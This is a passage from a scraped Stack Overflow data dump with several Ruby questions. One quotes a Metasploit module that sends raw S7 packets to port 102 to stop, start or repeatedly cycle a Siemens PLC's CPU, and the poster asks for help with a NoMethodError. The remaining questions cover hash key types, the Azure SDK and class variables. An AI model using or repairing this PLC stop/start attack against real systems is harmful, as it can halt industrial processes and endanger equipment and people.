'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-186-01.pdf' ],\n                    [ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-161-01.pdf' ],\n                ],\n            'Version'        =&gt; '$Revision$',\n          'DisclosureDate' =&gt; 'May 09 2011'\n          ))\n\n          register_options(\n              [\n                  Opt::RPORT(102),\n                  OptInt.new('MODE', [false, 'Set true to put the CPU back into RUN mode.',false]),\n                  OptInt.new('CYCLES',[true,\"Set the amount of CPU STOP/RUN cycles.\",10])\n            ], self.class)\n        end\n\n    def run_host(ip)\n        begin\n\n        cpu = datastore['MODE'] || ''\n        cycles = datastore['CYCLES'] || ''\n\n        stop_cpu_pkt = \n          [\n                       \"\\x03\\x00\\x00\\x16\\x11\\xe0\\x00\\x00\"+ \n                       \"\\x00\\x01\\x00\\xc1\\x02\\x01\\x00\\xc2\"+ \n                   \"\\x02\\x01\\x02\\xc0\\x01\\x09\",\n\n                \"\\x03\\x00\\x00\\x19\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\xff\\xff\\x00\\x08\\x00\"+ \n                \"\\x00\\xf0\\x00\\x00\\x01\\x00\\x01\\x03\"+ \n                \"\\xc0\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x00\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x40\\x00\\x01\\x84\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x21\\x02\\xf0\\x80\\x32\"+\n                \"\\x01\\x00\\x00\\x00\\x02\\x00\\x10\\x00\"+ \n                \"\\x00\\x29\\x00\\x00\\x00\\x00\\x00\\x09\"+ \n                \"\\x50\\x5f\\x50\\x52\\x4f\\x47\\x52\\x41\"+ \n                \"\\x4d\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\"\n          ]\n\n        start_cpu_pkt = \n          [\n                    \"\\x03\\x00\\x00\\x16\\x11\\xe0\\x00\\x00\"+ \n                \"\\x00\\x01\\x00\\xc1\\x02\\x01\\x00\\xc2\"+ \n                \"\\x02\\x01\\x02\\xc0\\x01\\x09\",\n\n                \"\\x03\\x00\\x00\\x19\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\xff\\xff\\x00\\x08\\x00\"+ \n                \"\\x00\\xf0\\x00\\x00\\x01\\x00\\x01\\x03\"+ \n                \"\\xc0\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x00\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x40\\x00\\x01\\x84\\x00\\x00\\x00\",\n\n                \"\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80\\x32\"+ \n                \"\\x01\\x00\\x00\\x00\\x01\\x00\\x0e\\x00\"+ \n                \"\\x00\\x04\\x01\\x12\\x0a\\x10\\x02\\x00\"+ \n                \"\\x10\\x00\\x00\\x83\\x00\\x00\\x00\",\n\n\n                \"\\x03\\x00\\x00\\x25\\x02\\xf0\\x80\\x32\"+  \n                \"\\x01\\x00\\x00\\x00\\x02\\x00\\x14\\x00\"+ \n                \"\\x00\\x28\\x00\\x00\\x00\\x00\\x00\\x00\"+ \n                \"\\xfd\\x00\\x00\\x09\\x50\\x5f\\x50\\x52\"+\n                \"\\x4f\\x47\\x52\\x41\\x4d\"\n\n                ]\n        # CPU STOP      \n        if(cpu == 1)\n        connect()\n        stop_cpu_pkt.each do |i|\n          sock.put(\"#{i}\")\n          sleep(0.005)\n          end\n      end\n      # CPU START\n      if(cpu == 2)\n        connect()\n        start_cpu_pkt.each do |i|\n          sock.put(\"#{i}\")\n          sleep(0.005)\n          end\n      end\n    # STOP / START CPU \n    for n in 0..cycles\n      if(cpu == 3)\n        connect()\n        # We assume PLC is up and running (issue a stop command)\n        stop_cpu_pkt.each do |i|  \n          sock.put(\"#{i}\")\n          sleep(0.005)\n        end\n\n        connect()\n        # We assume PLC is has been stopped (issue a start command)\n      start_cpu_pkt.each do |i|\n        sock.put(\"#{i}\")\n          sleep(0.005)\n          end\n      end\n  end\n\n    data = sock.get_once()  \n        print_good(\"#{ip} PLC is running, iso-tsap port is open.\")\n    if(cpu == 'true')\n        print_status(\"Putting the PLC into START mode.\")\n            elsif(cpu == 'false')\n                print_status(\"Putting the PLC into STOP mode.\")\n            end\n            disconnect()\n            rescue ::EOFError\n        end\n    end\nend\n</code></pre>\n\n<p>When running this exploit in Metasploit I can change all options.\nWhen I try to run I get the following error: <code>Auxiliary failed: NoMethodError undefined method 'get_once' for nil:NilClass</code> (see <a href=\"https://i.stack.imgur.com/oVEhx.png\" rel=\"nofollow noreferrer\">Metasploit_error</a>)</p>\n\n<p>I did not write this code, and I am unfortunately not familiar with the Ruby language. \nI hope you can help me fix this!</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511858519, "post_id": 47527201, "comment_id": 82010460, "body": "&quot;raise system_errors[:error_class].new&quot; - what kind of keys do you think <code>system_errors</code> contains? Does it contain <code>:error_class</code>?"}, {"owner": {"reputation": 7004, "user_id": 1103606, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/0d93cc650b93939ea91066fcb5aefae0?s=128&d=identicon&r=PG", "display_name": "Peter Penzov", "link": "https://stackoverflow.com/users/1103606/peter-penzov"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511858593, "post_id": 47527201, "comment_id": 82010514, "body": "I just saw it. I will update my answer."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511858674, "post_id": 47527201, "comment_id": 82010571, "body": "Same question, do you think it contains <code>:response_code</code>? What is the difference between <code>:response_code</code> and <code>response_code</code>?"}, {"owner": {"reputation": 7004, "user_id": 1103606, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/0d93cc650b93939ea91066fcb5aefae0?s=128&d=identicon&r=PG", "display_name": "Peter Penzov", "link": "https://stackoverflow.com/users/1103606/peter-penzov"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511858724, "post_id": 47527201, "comment_id": 82010598, "body": "I updated the post."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511858766, "post_id": 47527201, "comment_id": 82010618, "body": "Do you think <code>340</code> will be equal to <code>&quot;340&quot;</code>? This is not javascript :)"}, {"owner": {"reputation": 7004, "user_id": 1103606, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/0d93cc650b93939ea91066fcb5aefae0?s=128&d=identicon&r=PG", "display_name": "Peter Penzov", "link": "https://stackoverflow.com/users/1103606/peter-penzov"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511859236, "post_id": 47527201, "comment_id": 82010914, "body": "no - this s the mistake."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511859313, "post_id": 47527201, "comment_id": 82010969, "body": "Yep, that it is. And also two others that we found above :)"}], "answers": [{"tags": [], "owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "is_accepted": false, "score": 0, "last_activity_date": 1511884562, "creation_date": 1511884562, "answer_id": 47535743, "question_id": 47527201, "link": "https://stackoverflow.com/questions/47527201/parse-response-undefined-method-new-for-nilnilclass-nomethoderror/47535743#47535743", "title": "`parse_response&#39;: undefined method `new&#39; for nil:NilClass (NoMethodError)", "body": "<p>Unlike Javascript, Ruby does not implicitly convert between types.</p>\n\n<pre><code>(200..999).each do |current|\n  system_errors[current.to_s] = CommunicationError\nend\n# now we have\nsystem_errors[\"340\"] == CommunicationError\n</code></pre>\n\n<p>So later when you do</p>\n\n<pre><code>raise system_errors[340].new(technical_message, response_code)\n</code></pre>\n\n<p>It uses the <em>interger</em> key <code>340</code> rather than the <em>string</em> key <code>\"340\"</code>. Missing keys return <code>nil</code>, so you're calling <code>nil.new</code>. Decide on whether you're going to use integer or string keys and stick to it when inserting/reading.</p>\n"}], "owner": {"reputation": 7004, "user_id": 1103606, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/0d93cc650b93939ea91066fcb5aefae0?s=128&d=identicon&r=PG", "display_name": "Peter Penzov", "link": "https://stackoverflow.com/users/1103606/peter-penzov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 131, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511884562, "creation_date": 1511858322, "last_edit_date": 1511858690, "question_id": 47527201, "link": "https://stackoverflow.com/questions/47527201/parse-response-undefined-method-new-for-nilnilclass-nomethoderror", "title": "`parse_response&#39;: undefined method `new&#39; for nil:NilClass (NoMethodError)", "body": "<p>I want to implement method which raises errors based on status code. I tried to implement this code:</p>\n\n<pre><code>def parse_response\n\n    system_errors = { }\n\n    (100..199).each do |current|\n      system_errors[current.to_s] = SystemError\n    end\n\n    (200..999).each do |current|\n      system_errors[current.to_s] = CommunicationError\n    end\n\n    return params_for_success if successful_response?\n\n    # pp system_errors\n    pp payment_response\n    if valid?\n      raise system_errors[340].new(technical_message, response_code)\n    else\n      raise errors.full_messages.join(\";\\n\")\n    end\n  end\n\n  def successful_response?\n    response_code == RESPONSE_CODE_FOR_SUCCESS\n  end\n\n  def params_for_success\n    payment_response.dig(:payment_response)\n  end\n\n.....\n\nclass CommunicationError &lt; StandardError\n  def initialize(current_technical_message, response_code)\n    @response = response\n  end\nend\n</code></pre>\n\n<p>But I get error <code>parse_response': undefined method</code>new' for nil:NilClass (NoMethodError)`</p>\n\n<p>What is the proper way to raise error based on a range of numbers?\nThis line is causing the issue: <code>system_errors[:error_class].new(technical_message, response_code)</code></p>\n"}, {"tags": ["ruby", "api", "azure", "sdk", "azure-resource-manager"], "comments": [{"owner": {"reputation": 16980, "user_id": 6997262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbad57a52de9c231e494995eebd51f2a?s=128&d=identicon&r=PG&f=1", "display_name": "Shui shengbao", "link": "https://stackoverflow.com/users/6997262/shui-shengbao"}, "edited": false, "score": 0, "creation_date": 1511855353, "post_id": 47526171, "comment_id": 82008692, "body": "Do you check this <a href=\"https://github.com/Azure/azure-sdk-for-ruby/tree/ARM-0.9.0/management/azure_mgmt_resources\" rel=\"nofollow noreferrer\">example</a>?"}, {"owner": {"reputation": 16980, "user_id": 6997262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbad57a52de9c231e494995eebd51f2a?s=128&d=identicon&r=PG&f=1", "display_name": "Shui shengbao", "link": "https://stackoverflow.com/users/6997262/shui-shengbao"}, "edited": false, "score": 0, "creation_date": 1511855398, "post_id": 47526171, "comment_id": 82008712, "body": "You need configure authentication in your code.  <code>token_provider = MsRestAzure::ApplicationTokenProvider.new(tenant_id, client_id, secret)</code> <code>credentials = MsRest::TokenCredentials.new(token_provider)</code>"}, {"owner": {"reputation": 31, "user_id": 8579922, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/980Ua.png?s=128&g=1", "display_name": "m_nazir", "link": "https://stackoverflow.com/users/8579922/m-nazir"}, "reply_to_user": {"reputation": 16980, "user_id": 6997262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbad57a52de9c231e494995eebd51f2a?s=128&d=identicon&r=PG&f=1", "display_name": "Shui shengbao", "link": "https://stackoverflow.com/users/6997262/shui-shengbao"}, "edited": false, "score": 0, "creation_date": 1511859065, "post_id": 47526171, "comment_id": 82010803, "body": "The correct credentials are being passed"}, {"owner": {"reputation": 16980, "user_id": 6997262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbad57a52de9c231e494995eebd51f2a?s=128&d=identicon&r=PG&f=1", "display_name": "Shui shengbao", "link": "https://stackoverflow.com/users/6997262/shui-shengbao"}, "edited": false, "score": 0, "creation_date": 1511860528, "post_id": 47526171, "comment_id": 82011741, "body": "Hi, could you share you code?"}, {"owner": {"reputation": 31, "user_id": 8579922, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/980Ua.png?s=128&g=1", "display_name": "m_nazir", "link": "https://stackoverflow.com/users/8579922/m-nazir"}, "reply_to_user": {"reputation": 16980, "user_id": 6997262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbad57a52de9c231e494995eebd51f2a?s=128&d=identicon&r=PG&f=1", "display_name": "Shui shengbao", "link": "https://stackoverflow.com/users/6997262/shui-shengbao"}, "edited": false, "score": 0, "creation_date": 1511861209, "post_id": 47526171, "comment_id": 82012226, "body": "I am using the fog-azure-rm library for this. You can check it out here Link =&gt; <a href=\"https://github.com/fog/fog-azure-rm\" rel=\"nofollow noreferrer\">github.com/fog/fog-azure-rm</a>"}], "owner": {"reputation": 31, "user_id": 8579922, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/980Ua.png?s=128&g=1", "display_name": "m_nazir", "link": "https://stackoverflow.com/users/8579922/m-nazir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 77, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1511879422, "creation_date": 1511854154, "last_edit_date": 1511879422, "question_id": 47526171, "link": "https://stackoverflow.com/questions/47526171/azure-sdk-call-returns-bad-request-a-k-a-400-for-resourcemanagementclientres", "title": "Azure SDK call returns &#39;Bad Request&#39; a.k.a 400 for ResourceManagementClient::Resources::check_existence Method", "body": "<p>I am using the 'azure_mgmt_resources -v 0.15.1' gem of Azure SDK. I am trying to check the existence of a particular resource on Azure.</p>\n\n<p>This is my code</p>\n\n<pre><code>require 'azure_mgmt_resources'\ninclude Azure::Resources::Mgmt::V2017_05_10\ninclude Azure::Resources::Mgmt::V2017_05_10::Models\n\nprovider = MsRestAzure::ApplicationTokenProvider.new(\n    'Tenant ID',\n    'Client ID',\n    'Client Secret')\ncredentials = MsRest::TokenCredentials.new(provider)\n\nclient = ResourceManagementClient.new(credentials)\nclient.subscription_id = 'Subscription ID'\n\nresponse = client.resources.check_existence('Resource Group Name', 'Resource Provider', 'Parent Resource ID', 'Resource Type', 'Resource Name', 'API VERSION')\n</code></pre>\n\n<p>I am running the following two use cases</p>\n\n<p><strong>1. When Resource Does Not Exist</strong></p>\n\n<p>I pass false values to the check_existence method. For this I get back a 404 HTTP response code meaning that the\n    resource does not exist, which is the expected response. This use\n    case works fine.</p>\n\n<p><strong>2. When Resource Does Exist</strong></p>\n\n<p>I pass the correct values here and I get a 400 HTTP response code meaning that the request I sent is a bad one. I have used the same code as written above for both these cases.</p>\n\n<p>My final analysis is that there is some sort of problem with the Azure server side that it is not returning a correct response when the resource clearly exists. Has anyone else encountered this error? Any feedback would be appreciated.</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1511854439, "post_id": 47526117, "comment_id": 82008213, "body": "That is how class variables work."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 1, "creation_date": 1511854523, "post_id": 47526117, "comment_id": 82008266, "body": "@sawa: In class hierarchies, yes. But why here?"}], "answers": [{"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511854502, "post_id": 47526242, "comment_id": 82008252, "body": "But <i>why</i> class variable behaves that way? :)"}, {"owner": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "edited": false, "score": 1, "creation_date": 1511854536, "post_id": 47526242, "comment_id": 82008276, "body": "Hi @mudasobwa - I understand about class instance variables and why it should be used. In this case, I am surprised and wondering why class variables are behaving this way? class variables should only be accessible in base class and it&#39;s child classes."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 2, "creation_date": 1511854627, "post_id": 47526242, "comment_id": 82008322, "body": "\u201cclass variables should only be accessible in base class and it&#39;s child classes\u201d\u2014plain wrong. There are many resources (tons of them) on why it behaves how it behaves. This is done intentionally by Matz and I would not share my own opinion on why nice persons sometimes take wrong decisions."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511854634, "post_id": 47526242, "comment_id": 82008328, "body": "@mudasobwa: I mean, there&#39;s no class hierarchy here. By design, class variables are visible in a class and its descendants. Here it seems to travel up the ancestors chain and then <i>down</i>."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511854689, "post_id": 47526242, "comment_id": 82008350, "body": "@SergioTulentsev class hierarchy here starts with <code>XYZ.singleton_class</code>. Are you trolling?"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511854763, "post_id": 47526242, "comment_id": 82008390, "body": "@SergioTulentsev Inclusion of a module is internally handled as class hierarchy."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511854858, "post_id": 47526242, "comment_id": 82008441, "body": "@mudasobwa No, not trolling, just not enough coffee. Ancestors chain, yes. <i>But</i> the var is set with class_eval. Hence, it&#39;s the base that should own it, not the module. &#175;\\_(\u30c4)_/&#175;"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511854876, "post_id": 47526242, "comment_id": 82008446, "body": "@mudasobwa: it <i>does</i> only work downwards, tho: <a href=\"https://gist.github.com/stulentsev/89a48dbb706267221669f29d7ada78bf\" rel=\"nofollow noreferrer\">gist.github.com/stulentsev/89a48dbb706267221669f29d7ada78bf</a>"}, {"owner": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "edited": false, "score": 0, "creation_date": 1511854879, "post_id": 47526242, "comment_id": 82008450, "body": "Thanks, I just did <code>XYZ.class_variables</code> and it showed <code>@@foo</code>. Weird. I didn&#39;t expect that via <code>class_eval</code> and so much complications with class variables"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "edited": false, "score": 0, "creation_date": 1511855022, "post_id": 47526242, "comment_id": 82008518, "body": "@kiddorails: one more reason to avoid them :)"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511855130, "post_id": 47526242, "comment_id": 82008580, "body": "@SergioTulentsev It does not contradict with the gist you have pasted. When a module is included into a class, the module becomes the parent of the class. (With <code>prepend</code>, the module becomes a child of the class, and I am not sure what happens with it.)"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1511855254, "post_id": 47526242, "comment_id": 82008642, "body": "@sawa the same: <code>module M; end; class C; prepend M; end; C.ancestors.first #\u21d2 M</code>."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1511855270, "post_id": 47526242, "comment_id": 82008650, "body": "@sawa: but here the var is not defined in the module. It&#39;s defined on the base directly (supposedly)."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511855321, "post_id": 47526242, "comment_id": 82008678, "body": "ah I think I got it, hold on :)"}, {"owner": {"reputation": 209014, "user_id": 